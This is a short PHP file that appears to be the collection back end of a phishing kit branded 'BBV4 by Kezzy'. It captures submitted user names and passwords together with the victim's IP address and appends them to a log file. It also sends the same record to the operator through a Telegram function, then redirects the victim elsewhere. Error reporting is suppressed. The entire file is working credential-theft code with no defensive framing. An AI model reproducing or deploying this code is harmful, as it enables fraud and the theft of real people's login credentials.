<?php
error_reporting(0);
include '../config.php';
include './af.php';
$ip = $_SERVER['REMOTE_ADDR']; 
if (isset($_POST['nombd'])) {
    $msg  = "➖➖➖➖[ BBV4 by Kezzy]➖➖➖➖\r\n";
    $msg .= "✔️ {$_POST['din']} : {$_POST['nombd']}\r\n";
    $msg .= "✔️ USER : {$_POST['nompi']}\r\n";
    $msg .= "✔️ PA55 : {$_POST['calss']}\r\n";
    $msg .= "➖➖➖➖INFO➖➖➖➖\r\n";
    $msg .= "🌐 IP : ".$ip."\r\n";
    $msg .= "➖➖➖➖[@KezzySSJ]➖➖➖➖\r\n\r\n\r\n";
    $save = fopen("../".$txt.".txt", "a+");
    fwrite($save, $msg);
    fclose($save);
    sendTg($msg, $key, $id); 
    header("location: $out");
}
?>